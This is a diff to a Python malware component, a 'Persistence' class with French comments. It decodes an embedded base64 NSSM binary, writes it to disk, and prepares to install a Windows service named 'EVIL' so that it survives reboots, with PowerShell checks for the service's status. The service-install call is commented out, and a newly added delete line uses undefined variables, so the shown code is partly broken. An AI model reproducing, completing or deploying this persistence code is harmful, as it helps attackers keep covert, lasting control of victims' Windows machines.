@@ -12,7 +12,8 @@ from powershell import Powershell
 
 class Persistence():
     def __init__(self):
-        self.absCwd = os.getcwd()
+        # self.absCwd = os.getcwd()
+        self._absCwd = os.path.dirname(__file__)
         self._serviceName = "EVIL"
         self._fileName = "nssm.exe"
         # Dans VScode pour enlever le line wrapping «'left-alt' + 'z'» 
@@ -23,30 +24,34 @@ class Persistence():
 
     
     def _archVersion(self):
-        if getoutput(Powershell.GetInfo.GETARCH.value).strip() == "64-bit":
+        if getoutput(Powershell.GetInfo.ARCH.value).strip() == "64-bit":
             return self._nssm64bitBase64
         else:
             return self._nssm32bitBase64
         
-    def _writePayload(self, filename, payload):
+    def _writePayload(self, path, filename, payload):
         # "Créer un nouveau fichier à partir du payload une string en base64"
-        with open(filename, "wb") as copy:
+        with open(f"{path}\\{filename}", "wb") as copy:
             copy.write(base64.b64decode(payload))
     
     def _serviceInstalled(self):
         #check if service is installed
-        if getoutput(Powershell.GetInfo.CHECKEVILSERVICE.value).strip() == "":
+        if getoutput(Powershell.Persist.CHECKEVILSTATUS.value).strip() == "":
             return False
         else:
             return True
 
     def _installService(self):
-        if not self._serviceInstalled:
-            self._writePayload(self._fileName, self._archVersion())
+        if not self._serviceInstalled():
+            self._writePayload(self._absCwd, self._fileName, self._archVersion())
+            # TODO 
             # call(f".\\{self._fileName} install {self._serviceName} {self.absCwd}")
+            call(f"del {path}\\{filename}")
 
     
     def main(self):
+        # print(getoutput(Powershell.Persist.CHECKEVILSTATUS.value))
+        # print(Powershell.Persist.CHECKEVILSTATUS.value)
         self._installService()
 
 if __name__ == "__main__":
